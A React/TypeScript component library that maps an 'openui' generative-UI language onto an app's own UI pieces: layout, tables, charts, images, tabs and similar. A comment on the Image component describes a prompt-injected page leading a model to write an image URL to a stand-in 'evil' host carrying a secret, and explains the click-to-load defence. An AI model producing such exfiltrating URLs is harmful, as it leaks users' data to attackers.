/* ── The openui language's component library ──
   A model that answers in `openui` writes `identifier = Component(...)` lines,
   and this is the table those names resolve against. Two rules decided the
   contents:

   — the pieces are the harness's own, so a generated card wears the transcript
     rather than being a second design system inside it: `Notice` for a callout,
     `Empty` for an absence, `harness-table` for a grid (the class the markdown
     renderer's tables wear, and the one `.prose` styles), the `--chart-*` tokens
     for a chart;
   — the schemas stay flat and shallow, which is what the language asks of its
     libraries: every component is a container of strings or a small record, and
     composition is `z.array(Component.ref)`. A deeply nested prop burns tokens
     and is where generation goes wrong.

   Nothing here reaches the network or the app's state. The fence's caller does
   not pass a `toolProvider`, so a `Query(...)` in a generated program has no
   tool to find and is dropped by the parser — the model composes a *view* over
   what it already knows, and every tool call the thread makes stays a normal
   ACP call. `bindings` and `toolCalls` are off in the prompt for that reason
   (`scripts/gen-openui.mjs`, whose output is `agent/src/openui-prompt.ts`): a
   form the model writes would otherwise render inputs that bind to a runtime
   this surface deliberately does not have. */
import { z } from "zod/v4"
import { useState } from "react"
import {
  Area,
  AreaChart,
  Bar,
  BarChart,
  CartesianGrid,
  Cell,
  Line,
  LineChart,
  Pie,
  PieChart,
  PolarAngleAxis,
  PolarGrid,
  Radar,
  RadarChart,
  XAxis,
  YAxis,
} from "recharts"
import { createLibrary, defineComponent } from "@openuidev/react-lang"
import { Empty } from "@/components/empty"
import { Accordion as UiAccordion, AccordionContent, AccordionItem, AccordionTrigger } from "@/components/ui/accordion"
import { Avatar, AvatarFallback } from "@/components/ui/avatar"
import { Carousel, CarouselContent, CarouselItem, CarouselNext, CarouselPrevious } from "@/components/ui/carousel"
import { DiffView } from "@/components/ui/diff-view"
import { Kbd, KbdGroup } from "@/components/ui/kbd"
import { Tabs as UiTabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Notice } from "@/components/notice"
import {
  ChartContainer,
  ChartLegend,
  ChartLegendContent,
  ChartTooltip,
  ChartTooltipContent,
} from "@/components/ui/chart"
import { cn } from "@/lib/utils"

/* One vertical rhythm for everything that holds children — Stack, Card, Details —
   so a card's sections sit as far apart as the cards around it. Tighter below
   `@panel-sm`, where a desktop gap reads as a wall. */
const GAP = { sm: "gap-2", md: "gap-2.5 @panel-sm:gap-3", lg: "gap-3 @panel-sm:gap-4" } as const

/** `root` is the container the prompt insists on wrapping every program in, and
    it is the harness's stack of sections: vertical by default, a row for the
    cluster of numbers at the top of a dashboard. */
const Stack = defineComponent({
  name: "Stack",
  description: "Vertical container. The root element every OpenUI program starts from.",
  props: z.object({
    children: z.array(z.any()),
    direction: z.enum(["column", "row"]).optional(),
    gap: z.enum(["sm", "md", "lg"]).optional(),
  }),
  component: ({ props, renderNode }) => (
    <div
      className={cn(
        "flex min-w-0",
        props.direction === "row" ? "flex-row flex-wrap items-stretch" : "flex-col",
        /* A dashboard spaced for a desktop column reads as a wall in a phone
           panel: the gaps tighten below `@panel-sm` and open back up above it.
           The panel's width decides, never the window's — a chat docked narrow
           beside a terminal is the case these queries exist for. */
        GAP[props.gap ?? "md"]
      )}
    >
      {renderNode(props.children)}
    </div>
  ),
})

/**
 * A card: the transcript's own geometry (`CARD` in `tool-parts.tsx`), so a
 * generated one sits beside a tool step without looking like a different app.
 * Square to the width it is given, because the caller decides the column.
 */
const Card = defineComponent({
  name: "Card",
  description: "A titled panel holding a group of sections.",
  props: z.object({
    title: z.string(),
    subtitle: z.string().optional(),
    children: z.array(z.any()),
  }),
  component: ({ props, renderNode }) => (
    <section className="min-w-0 w-full rounded-xl border border-border/60 bg-muted/30 px-2.5 py-2 @panel-sm:px-3 @panel-sm:py-2.5">
      <header className="mb-2.5 space-y-0.5">
        <h3 className="text-sm font-semibold text-pretty text-foreground">{props.title}</h3>
        {props.subtitle && (
          <p className="text-xs text-pretty text-muted-foreground">{props.subtitle}</p>
        )}
      </header>
      <div className={cn("flex min-w-0 flex-col", GAP.md)}>{renderNode(props.children)}</div>
    </section>
  ),
})

/* A heading and a line under it. The text is drawn as plain characters rather
   than through the app's markdown renderer: that renderer lives in
   `tool-parts.tsx`, which is what this library is reached *from*, and a
   `Prose` import here would close that cycle for the sake of bold in a caption. */
const Section = defineComponent({
  name: "Section",
  description: "A heading with an optional line of explanatory text.",
  props: z.object({
    title: z.string(),
    text: z.string().optional(),
  }),
  component: ({ props }) => (
    <div className="min-w-0 space-y-1">
      <p className="text-[10px] font-semibold tracking-[0.08em] uppercase text-muted-foreground/50">
        {props.title}
      </p>
      {props.text && <p className="text-[12.5px] leading-relaxed text-foreground/90">{props.text}</p>}
    </div>
  ),
})

/** One number with its label under it — the unit a row of metrics is made of. */
const Stat = defineComponent({
  name: "Stat",
  description: "A single metric: a label and a value.",
  props: z.object({
    label: z.string(),
    value: z.string(),
    hint: z.string().optional(),
  }),
  /* The one component whose mobile shape matters most: a row of four of these
     on a phone panel wraps into pairs (the `basis` at `StatRow`), and each one
     has to stand alone in half the width without its number wrapping mid-figure.
     `min-w-0` + `tabular-nums` keep the digits on one line, and the label may
     take two lines rather than forcing the box wider than its share. */
  component: ({ props }) => (
    <div className="min-w-0 flex-1 rounded-lg border border-border/50 bg-background/50 px-2.5 py-2">
      <p className="text-[10px] leading-tight font-semibold tracking-[0.08em] uppercase text-balance text-muted-foreground/60">
        {props.label}
      </p>
      <p className="mt-0.5 text-base leading-tight font-semibold tabular-nums text-foreground @panel-sm:text-lg">
        {props.value}
      </p>
      {props.hint && <p className="mt-0.5 text-[11px] text-pretty text-muted-foreground">{props.hint}</p>}
    </div>
  ),
})

/** A row of `Stat`s. Its schema is the stats and nothing else, which is the
    whole reason it exists: `Stack` cannot say "these are numbers". */
const StatRow = defineComponent({
  name: "StatRow",
  description: "A row of metrics across the width of the page.",
  props: z.object({
    stats: z.array(Stat.ref),
  }),
  /* The mobile fix here is the `basis` each `Stat` grows from, set on the stat
     itself (`flex-1` under a `min-w-0` parent): four of them fall two-up in a
     narrow panel and sit in one row when there is room, which is what keeps a
     phone from getting four cramped columns with three-line labels. */
  component: ({ props, renderNode }) => (
    <div className="flex min-w-0 flex-wrap items-stretch gap-2">{renderNode(props.stats)}</div>
  ),
})

/**
 * A table.
 *
 * Plain string margins rather than a row-of-cells schema: the language has no
 * cell type, and a model that has to declare a column set *and* keep its rows in
 * that order gets the pairing wrong far more often than it gets one array of
 * strings wrong. `header` is on by default and off for a grid that has none.
 *
 * The `harness-table` / `prose` spine is not cosmetic: that is what the
 * markdown renderer's own tables wear (`MARKDOWN_COMPONENTS` in `tool-parts.tsx`)
 * and what `index.css` styles, so a table the model writes by hand and one the
 * language draws are the same table.
 */
const Table = defineComponent({
  name: "Table",
  description: "A grid of text cells. `columns` names the headings and each entry of `rows` is one row.",
  props: z.object({
    columns: z.array(z.string()),
    rows: z.array(z.array(z.string())),
    header: z.boolean().optional(),
    tone: z.enum(["default", "muted", "accent"]).optional(),
  }),
  /* The `harness-table` wrapper is the scroll container (`index.css`): a table
     wider than a phone panel scrolls inside the turn rather than widening it,
     which is the whole reason that class exists. Nothing extra is needed here —
     the frame is shared with every markdown table in the transcript, on purpose. */
  component: ({ props }) => (
    <div className={cn("prose prose-sm max-w-none")}>
      <div className="harness-table">
        <table>
          {props.header !== false && (
            <thead>
              <tr>
                {props.columns.map((column, index) => (
                  <th key={index}>{column}</th>
                ))}
              </tr>
            </thead>
          )}
          <tbody>
            {props.rows.map((row, rowIndex) => (
              <tr key={rowIndex}>
                {props.columns.map((_, cellIndex) => (
                  <td
                    key={cellIndex}
                    className={cn(
                      "align-top",
                      props.tone === "muted" && "text-muted-foreground",
                      props.tone === "accent" && cellIndex === 0 && "font-medium text-foreground"
                    )}
                  >
                    {row[cellIndex] ?? ""}
                  </td>
                ))}
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  ),
})

/** A list of short lines — steps, options, facts. */
const List = defineComponent({
  name: "List",
  description: "Short lines, numbered or bulleted.",
  props: z.object({
    items: z.array(z.string()),
    numbered: z.boolean().optional(),
  }),
  component: ({ props }) =>
    props.numbered ? (
      <ol className="ms-4 list-decimal space-y-1 text-[12.5px] text-foreground/90">
        {props.items.map((item, index) => (
          <li key={index}>{item}</li>
        ))}
      </ol>
    ) : (
      <ul className="ms-4 list-disc space-y-1 text-[12.5px] text-foreground/90">
        {props.items.map((item, index) => (
          <li key={index}>{item}</li>
        ))}
      </ul>
    ),
})

/**
 * A callout. `Notice` is the app's one alert box, and the four tones are
 * semantic there (`error` destructive, `warn` amber, `info` sky, `neutral` the
 * muted ground) — so this component passes the tone through rather than
 * painting its own colours.
 */
const Callout = defineComponent({
  name: "Callout",
  description: "A boxed aside: info, warn, error or neutral, with an optional title.",
  props: z.object({
    text: z.string(),
    tone: z.enum(["neutral", "info", "warn", "error"]).optional(),
    title: z.string().optional(),
  }),
  component: ({ props }) => (
    <Notice tone={props.tone ?? "neutral"} size="sm" title={props.title}>
      {props.text}
    </Notice>
  ),
})

/** A fenced code block, drawn as one. It is the transcript's terminal-ish
    ground rather than a syntax-highlighted pane: the model's code in a
    generated view is a reference, not a diff to read. */
const Code = defineComponent({
  name: "Code",
  description: "Preformatted text, a snippet or a log.",
  props: z.object({
    text: z.string(),
    language: z.string().optional(),
  }),
  /* `break-words` is the mobile half: generated code is model-written prose
     about code more often than it is a real snippet, and a long unbroken token
     in a phone panel would otherwise push the whole answer sideways. */
  component: ({ props }) => (
    <pre className="overflow-auto rounded-md border border-border/50 bg-muted/40 px-2.5 py-2 font-mono text-[11.5px] break-words whitespace-pre-wrap text-foreground/90">
      {props.text}
    </pre>
  ),
})

/** A chart: `labels` x-axis, `series` one mark each, the value at index `i`
    belonging to `labels[i]`. The colours are the app's `--chart-*` tokens, so a
    generated chart follows the reader's palette instead of naming its own.
    `pie`/`donut` read the first series only — a slice per label. */
const chartColor = (index: number) => `var(--chart-${(index % 5) + 1})`

const Chart = defineComponent({
  name: "Chart",
  description:
    "A chart over a shared set of labels: line, bar, area, radar, or pie/donut (first series only, one slice per label).",
  props: z.object({
    kind: z.enum(["line", "bar", "area", "pie", "donut", "radar"]),
    labels: z.array(z.string()),
    series: z.array(
      z.object({
        name: z.string(),
        values: z.array(z.number()),
      })
    ),
    height: z.number().optional(),
    stacked: z.boolean().optional(),
  }),
  component: ({ props }) => {
    const round = props.kind === "pie" || props.kind === "donut"
    const data = props.labels.map((label, index) => {
      const row: Record<string, string | number> = { label }
      for (const series of props.series) row[series.name] = series.values[index] ?? 0
      return row
    })
    const config = Object.fromEntries(
      round
        ? props.labels.map((label, index) => [label, { label, color: chartColor(index) }])
        : props.series.map((series, index) => [series.name, { label: series.name, color: chartColor(index) }])
    )
    const stack = props.stacked ? "a" : undefined
    /* The mobile work here is all in the gutters, because a chart cannot reflow:
       a 30px Y gutter and 11px ticks give a 320px panel most of its width back,
       and `preserveStartEnd` keeps the ends instead of every colliding label.
       `ChartContainer` passes `initialDimension`, so a panel not yet laid out
       draws a sized chart rather than an empty box. */
    const axes = (
      <>
        <CartesianGrid vertical={false} />
        <XAxis
          dataKey="label"
          tickLine={false}
          axisLine={false}
          tickMargin={6}
          fontSize={11}
          interval="preserveStartEnd"
        />
        <YAxis tickLine={false} axisLine={false} width={30} fontSize={11} />
        <ChartTooltip content={<ChartTooltipContent />} />
      </>
    )
    const margin = { left: 0, right: 6 }
    const legend = props.series.length > 1 && <ChartLegend content={<ChartLegendContent />} />
    return (
      <ChartContainer
        config={config}
        className="aspect-auto w-full"
        style={{ height: `${props.height ?? (round || props.kind === "radar" ? 240 : 200)}px` }}
      >
        {round ? (
          <PieChart>
            <ChartTooltip content={<ChartTooltipContent nameKey="label" hideLabel />} />
            <Pie
              data={props.labels.map((label, index) => ({ label, value: props.series[0]?.values[index] ?? 0 }))}
              dataKey="value"
              nameKey="label"
              innerRadius={props.kind === "donut" ? "55%" : 0}
              strokeWidth={2}
            >
              {props.labels.map((label, index) => (
                <Cell key={label} fill={chartColor(index)} />
              ))}
            </Pie>
            <ChartLegend content={<ChartLegendContent nameKey="label" />} />
          </PieChart>
        ) : props.kind === "radar" ? (
          <RadarChart data={data}>
            <PolarGrid />
            <PolarAngleAxis dataKey="label" fontSize={11} />
            <ChartTooltip content={<ChartTooltipContent />} />
            {props.series.map((series, index) => (
              <Radar
                key={series.name}
                dataKey={series.name}
                stroke={chartColor(index)}
                fill={chartColor(index)}
                fillOpacity={0.25}
              />
            ))}
            {legend}
          </RadarChart>
        ) : props.kind === "bar" ? (
          <BarChart data={data} margin={margin}>
            {axes}
            {props.series.map((series, index) => (
              <Bar key={series.name} dataKey={series.name} stackId={stack} fill={chartColor(index)} radius={stack ? 0 : 4} />
            ))}
            {legend}
          </BarChart>
        ) : props.kind === "area" ? (
          <AreaChart data={data} margin={margin}>
            {axes}
            {props.series.map((series, index) => (
              <Area
                key={series.name}
                type="monotone"
                dataKey={series.name}
                stackId={stack}
                stroke={chartColor(index)}
                fill={chartColor(index)}
                fillOpacity={0.25}
              />
            ))}
            {legend}
          </AreaChart>
        ) : (
          <LineChart data={data} margin={margin}>
            {axes}
            {props.series.map((series, index) => (
              <Line
                key={series.name}
                type="monotone"
                dataKey={series.name}
                stroke={chartColor(index)}
                strokeWidth={2}
                dot={false}
              />
            ))}
            {legend}
          </LineChart>
        )}
      </ChartContainer>
    )
  },
})

/**
 * An image. Remote images are the one thing in this library that would reach
 * the network, and a URL the model writes can carry whatever the thread has read
 * (a prompt-injected page asking for `https://evil/?q=<secret>`). So a `data:`
 * image draws at once and an `http(s)` one waits behind a click that names its
 * host — the reader's consent is the fetch. Anything else is not drawn.
 */
const Image = defineComponent({
  name: "Image",
  description: "An image from an https or data: URL, with alt text and an optional caption.",
  props: z.object({
    src: z.string(),
    alt: z.string(),
    caption: z.string().optional(),
  }),
  component: ({ props }) => <GeneratedImage {...props} />,
})

function GeneratedImage({ src, alt, caption }: { src: string; alt: string; caption?: string }) {
  const inline = /^data:image\/(png|jpe?g|gif|webp);/i.test(src)
  let host: string | null = null
  try {
    const url = new URL(src)
    if (url.protocol === "https:" || url.protocol === "http:") host = url.host
  } catch {
    /* not a URL — drawn as the alt text below */
  }
  const [shown, setShown] = useState(inline)
  const [failed, setFailed] = useState(false)
  return (
    <figure className="min-w-0 space-y-1">
      {shown && !failed ? (
        <img
          src={src}
          alt={alt}
          referrerPolicy="no-referrer"
          onError={() => setFailed(true)}
          className="max-h-96 max-w-full rounded-md border border-border/50 object-contain"
        />
      ) : host && !failed ? (
        <button
          type="button"
          onClick={() => setShown(true)}
          className="flex w-full flex-col items-start gap-0.5 rounded-md border border-dashed border-border/60 px-2.5 py-2 text-start hover:bg-muted/40"
        >
          <span className="text-[12.5px] text-foreground/90">{alt}</span>
          <span className="text-[11px] text-muted-foreground">Load image from {host}</span>
        </button>
      ) : (
        <Empty size="sm">{failed ? `Image failed to load: ${alt}` : alt}</Empty>
      )}
      {caption && <figcaption className="text-[11px] text-pretty text-muted-foreground">{caption}</figcaption>}
    </figure>
  )
}

/** Short labels in a row — statuses, tags, versions. */
const Badges = defineComponent({
  name: "Badges",
  description: "A row of short tags, each with an optional tone.",
  props: z.object({
    items: z.array(
      z.object({
        text: z.string(),
        tone: z.enum(["neutral", "info", "success", "warn", "error"]).optional(),
      })
    ),
  }),
  component: ({ props }) => (
    <div className="flex min-w-0 flex-wrap gap-1.5">
      {props.items.map((item, index) => (
        <span
          key={index}
          className={cn(
            "rounded-pill border px-2 py-0.5 text-[11px] font-medium",
            TONE_TEXT[item.tone ?? "neutral"]
          )}
        >
          {item.text}
        </span>
      ))}
    </div>
  ),
})

const TONE_TEXT = {
  neutral: "border-border/60 bg-muted/40 text-foreground/80",
  info: "border-sky-500/30 bg-sky-500/10 text-sky-700 dark:text-sky-300",
  success: "border-emerald-500/30 bg-emerald-500/10 text-emerald-700 dark:text-emerald-300",
  warn: "border-amber-500/30 bg-amber-500/10 text-amber-700 dark:text-amber-300",
  error: "border-destructive/30 bg-destructive/10 text-destructive",
} as const

/** Ordered events or steps with a state each — a release history, a plan's
    progress. The rail is the list, so no numbering is needed. */
const Timeline = defineComponent({
  name: "Timeline",
  description: "Ordered steps or events: a title, optional time and text, and a status.",
  props: z.object({
    items: z.array(
      z.object({
        title: z.string(),
        time: z.string().optional(),
        text: z.string().optional(),
        status: z.enum(["done", "active", "pending", "failed"]).optional(),
      })
    ),
  }),
  component: ({ props }) => (
    <ol className="min-w-0">
      {props.items.map((item, index) => (
        <li key={index} className="relative flex gap-2.5 pb-3 last:pb-0">
          {index < props.items.length - 1 && (
            <span className="absolute top-3 bottom-0 left-[4.5px] w-px bg-border/60" />
          )}
          <span
            className={cn(
              "mt-1 size-2.5 shrink-0 rounded-full border-2",
              item.status === "done" && "border-emerald-500 bg-emerald-500",
              item.status === "active" && "border-primary bg-background",
              item.status === "failed" && "border-destructive bg-destructive",
              (!item.status || item.status === "pending") && "border-border bg-background"
            )}
          />
          <div className="min-w-0 flex-1">
            <div className="flex min-w-0 flex-wrap items-baseline justify-between gap-x-2">
              <span className="text-[12.5px] font-medium text-foreground">{item.title}</span>
              {item.time && <span className="text-[11px] tabular-nums text-muted-foreground">{item.time}</span>}
            </div>
            {item.text && <p className="text-[12px] text-pretty text-muted-foreground">{item.text}</p>}
          </div>
        </li>
      ))}
    </ol>
  ),
})

/** A side-by-side comparison of two or more options — the pros-and-cons shape
    a table flattens into sentences. Stacks below `@panel-sm`. */
const Compare = defineComponent({
  name: "Compare",
  description: "Options side by side, each with a name, optional verdict, pros and cons.",
  props: z.object({
    options: z.array(
      z.object({
        name: z.string(),
        verdict: z.string().optional(),
        pros: z.array(z.string()).optional(),
        cons: z.array(z.string()).optional(),
      })
    ),
  }),
  component: ({ props }) => (
    <div className="grid min-w-0 gap-2 @panel-sm:grid-cols-[repeat(auto-fit,minmax(0,1fr))]">
      {props.options.map((option, index) => (
        <div key={index} className="min-w-0 space-y-1.5 rounded-lg border border-border/50 bg-background/50 px-2.5 py-2">
          <p className="text-[13px] font-semibold text-foreground">{option.name}</p>
          {option.verdict && <p className="text-[11.5px] text-muted-foreground">{option.verdict}</p>}
          <ul className="space-y-0.5 text-[12px]">
            {option.pros?.map((pro, i) => (
              <li key={`p${i}`} className="text-foreground/90">
                <span className="text-emerald-600 dark:text-emerald-400">+ </span>
                {pro}
              </li>
            ))}
            {option.cons?.map((con, i) => (
              <li key={`c${i}`} className="text-foreground/90">
                <span className="text-destructive">- </span>
                {con}
              </li>
            ))}
          </ul>
        </div>
      ))}
    </div>
  ),
})

/** A folded section: detail the reader may not need, closed by default. Native
    `<details>`, so it needs no state and survives the streaming re-render. */
const Details = defineComponent({
  name: "Details",
  description: "A collapsible section, closed unless `open` is true.",
  props: z.object({
    summary: z.string(),
    children: z.array(z.any()),
    open: z.boolean().optional(),
  }),
  component: ({ props, renderNode }) => (
    <details open={props.open} className="group min-w-0 rounded-md border border-border/50">
      <summary className="cursor-pointer px-2.5 py-1.5 text-[12.5px] font-medium text-foreground select-none">
        {props.summary}
      </summary>
      <div className={cn("flex flex-col border-t border-border/40 px-2.5 py-2", GAP.md)}>{renderNode(props.children)}</div>
    </details>
  ),
})

/* ── Wrappers over the app's own shadcn primitives ──
   Each is the `components/ui` piece the rest of the app already draws, given a
   flat schema. Nothing here can act: tabs, folds and slides move what is shown,
   never what is stored. */

/** Tabs: alternatives the reader flips between — per-platform steps, before and after. */
const Tabs = defineComponent({
  name: "Tabs",
  description: "Switchable panels: each tab has a label and its own children.",
  props: z.object({
    tabs: z.array(z.object({ label: z.string(), children: z.array(z.any()) })),
  }),
  component: ({ props, renderNode }) => (
    <UiTabs defaultValue={0} className="min-w-0">
      <TabsList className="max-w-full overflow-x-auto">
        {props.tabs.map((tab, index) => (
          <TabsTrigger key={index} value={index}>
            {tab.label}
          </TabsTrigger>
        ))}
      </TabsList>
      {props.tabs.map((tab, index) => (
        <TabsContent key={index} value={index} className={cn("flex min-w-0 flex-col", GAP.md)}>
          {renderNode(tab.children)}
        </TabsContent>
      ))}
    </UiTabs>
  ),
})

/** An FAQ-shaped fold: several questions, each opening on its own answer. */
const Accordion = defineComponent({
  name: "Accordion",
  description: "A list of collapsible items, each a title over its own children. Good for FAQs.",
  props: z.object({
    items: z.array(z.object({ title: z.string(), children: z.array(z.any()) })),
  }),
  component: ({ props, renderNode }) => (
    <UiAccordion className="min-w-0 rounded-md border border-border/50">
      {props.items.map((item, index) => (
        <AccordionItem key={index} value={index}>
          <AccordionTrigger className="px-2.5">{item.title}</AccordionTrigger>
          <AccordionContent className="px-2.5">
            <div className={cn("flex min-w-0 flex-col", GAP.md)}>{renderNode(item.children)}</div>
          </AccordionContent>
        </AccordionItem>
      ))}
    </UiAccordion>
  ),
})

/** A before/after of text, drawn by the same line diff tool steps use. */
const Diff = defineComponent({
  name: "Diff",
  description: "A line diff between old and new text, with an optional path.",
  props: z.object({
    before: z.string(),
    after: z.string(),
    path: z.string().optional(),
  }),
  component: ({ props }) => <DiffView oldText={props.before} newText={props.after} path={props.path} />,
})

/** Keyboard chords, drawn as keycaps. */
const Keys = defineComponent({
  name: "Keys",
  description: "Keyboard shortcuts: each entry is a list of keys and what the chord does.",
  props: z.object({
    items: z.array(z.object({ keys: z.array(z.string()), action: z.string() })),
  }),
  component: ({ props }) => (
    <div className="min-w-0 divide-y divide-border/40">
      {props.items.map((item, index) => (
        <div key={index} className="flex min-w-0 flex-wrap items-center justify-between gap-2 py-1.5">
          <span className="text-[12.5px] text-foreground/90">{item.action}</span>
          <KbdGroup>
            {item.keys.map((key, i) => (
              <Kbd key={i}>{key}</Kbd>
            ))}
          </KbdGroup>
        </div>
      ))}
    </div>
  ),
})

/** People: initials avatars, never a fetched picture (see `Image` for why). */
const People = defineComponent({
  name: "People",
  description: "A list of people with a name and optional role, drawn as initials avatars.",
  props: z.object({
    items: z.array(z.object({ name: z.string(), role: z.string().optional() })),
  }),
  component: ({ props }) => (
    <div className="flex min-w-0 flex-wrap gap-x-4 gap-y-2">
      {props.items.map((person, index) => (
        <div key={index} className="flex min-w-0 items-center gap-2">
          <Avatar size="sm">
            <AvatarFallback>
              {person.name
                .split(/\s+/)
                .slice(0, 2)
                .map((word) => word[0]?.toUpperCase() ?? "")
                .join("")}
            </AvatarFallback>
          </Avatar>
          <div className="min-w-0 leading-tight">
            <p className="truncate text-[12.5px] font-medium text-foreground">{person.name}</p>
            {person.role && <p className="truncate text-[11px] text-muted-foreground">{person.role}</p>}
          </div>
        </div>
      ))}
    </div>
  ),
})

/** Several images, one at a time. Each slide is an `Image`, so the click-to-load rule holds. */
const Gallery = defineComponent({
  name: "Gallery",
  description: "A carousel of images, each with src, alt and optional caption.",
  props: z.object({
    images: z.array(z.object({ src: z.string(), alt: z.string(), caption: z.string().optional() })),
  }),
  /* The arrows sit inside the frame: shadcn hangs them outside it (`-left-12`),
     which a transcript column has no room for. */
  component: ({ props }) => (
    <Carousel className="min-w-0">
      <CarouselContent>
        {props.images.map((image, index) => (
          <CarouselItem key={index}>
            <GeneratedImage {...image} />
          </CarouselItem>
        ))}
      </CarouselContent>
      {props.images.length > 1 && (
        <>
          <CarouselPrevious className="left-2" />
          <CarouselNext className="right-2" />
        </>
      )}
    </Carousel>
  ),
})

/** A labelled value with a bar under it — the one chart that needs no pairs of
    arrays, and the shape a "top N" answer usually wants. */
const Progress = defineComponent({
  name: "Progress",
  description: "A labelled 0–100 meter.",
  props: z.object({
    label: z.string(),
    value: z.number(),
    hint: z.string().optional(),
  }),
  component: ({ props }) => (
    <div className="min-w-0 space-y-1">
      {/* `flex-wrap` so a long label and its figure stack on a narrow panel
          instead of the figure being squeezed off the edge — the label is the
          only thing here that can be arbitrarily long. */}
      <div className="flex min-w-0 flex-wrap items-baseline justify-between gap-x-2">
        <span className="min-w-0 truncate text-[12.5px] text-foreground/90">{props.label}</span>
        <span className="shrink-0 text-[11px] tabular-nums text-muted-foreground">
          {props.hint ?? `${Math.round(props.value)}%`}
        </span>
      </div>
      <div className="h-1.5 overflow-hidden rounded-pill bg-muted">
        <div
          className="h-full rounded-pill bg-primary"
          style={{ width: `${Math.min(100, Math.max(0, props.value))}%` }}
        />
      </div>
    </div>
  ),
})

/** A definition list — the pair shape a table is too heavy for. */
const KeyValue = defineComponent({
  name: "KeyValue",
  description: "A list of named facts.",
  props: z.object({
    items: z.array(z.object({ key: z.string(), value: z.string() })),
  }),
  /* The key column is a *fixed* `w-32` only where there is room: on a phone
     panel a third of the width went to the label and every value wrapped into a
     ragged column. Below `@panel-sm` the pair stacks — key above value — and the
     divider between rows is what keeps it readable as a list rather than as
     twenty loose lines. */
  component: ({ props }) => (
    <dl className="divide-y divide-border/40 overflow-hidden rounded-md border border-border/50 bg-muted/40">
      {props.items.map((item, index) => (
        <div
          key={index}
          className="flex flex-col gap-0.5 px-2.5 py-1.5 text-[11.5px] @panel-sm:flex-row @panel-sm:items-start @panel-sm:gap-3"
        >
          <dt className="min-w-0 text-muted-foreground @panel-sm:w-32 @panel-sm:shrink-0 @panel-sm:truncate">
            {item.key}
          </dt>
          <dd className="min-w-0 break-words text-foreground/90 @panel-sm:flex-1">{item.value}</dd>
        </div>
      ))}
    </dl>
  ),
})

/** An absence, drawn as one: the app's dashed box, never an alert. */
const EmptyState = defineComponent({
  name: "EmptyState",
  description: "A box saying there is nothing to show.",
  props: z.object({
    text: z.string(),
  }),
  component: ({ props }) => <Empty size="sm">{props.text}</Empty>,
})

/** A divider, for a generated dashboard that wants one. */
const Divider = defineComponent({
  name: "Divider",
  description: "A horizontal rule.",
  props: z.object({}),
  component: () => <hr className="border-border/50" />,
})

export const openuiLibrary = createLibrary({
  root: "Stack",
  components: [
    Stack,
    Card,
    Section,
    StatRow,
    Stat,
    Table,
    List,
    Callout,
    Code,
    Chart,
    Progress,
    KeyValue,
    EmptyState,
    Divider,
    Image,
    Badges,
    Timeline,
    Compare,
    Details,
    Tabs,
    Accordion,
    Diff,
    Keys,
    People,
    Gallery,
  ],
  componentGroups: [
    {
      name: "Layout",
      components: ["Stack", "Card", "Section", "Divider", "Details", "Tabs", "Accordion"],
      notes: [
        "- `root = Stack([...])` is the entry point: every program must define it.",
        '- Use direction "row" for a cluster of cards; never nest a Stack in a Stack for spacing alone.',
        "- Tabs for alternatives the reader picks between (per OS, before/after); Accordion for FAQs; Details for one optional fold.",
      ],
    },
    {
      name: "Content",
      components: ["List", "Table", "Callout", "Code", "KeyValue", "EmptyState", "Image", "Badges", "Timeline", "Compare", "Diff", "Keys", "People", "Gallery"],
      notes: [
        "- Write each table row as its own array of strings, in the SAME order as `columns`.",
        "- A short answer is prose; reach for these when the answer is a structure.",
        "- Image only with a URL you were actually given; never invent one. Remote images are loaded only when the reader clicks.",
        "- Diff for a before/after of text, Keys for shortcuts, People for who is involved, Gallery for several images.",
        "- Compare for weighing options, Timeline for ordered steps or history, Badges for short statuses.",
      ],
    },
    {
      name: "Numbers",
      components: ["StatRow", "Stat", "Chart", "Progress"],
      notes: [
        "- `values` must be the same length as `labels`.",
        "- Prefer StatRow for a handful of figures and Chart for a trend.",
        "- Chart kind: line/area for trends, bar for comparisons (stacked for parts of a total), pie/donut for shares of one whole (few slices), radar for scoring options on several axes.",
      ],
    },
  ],
})

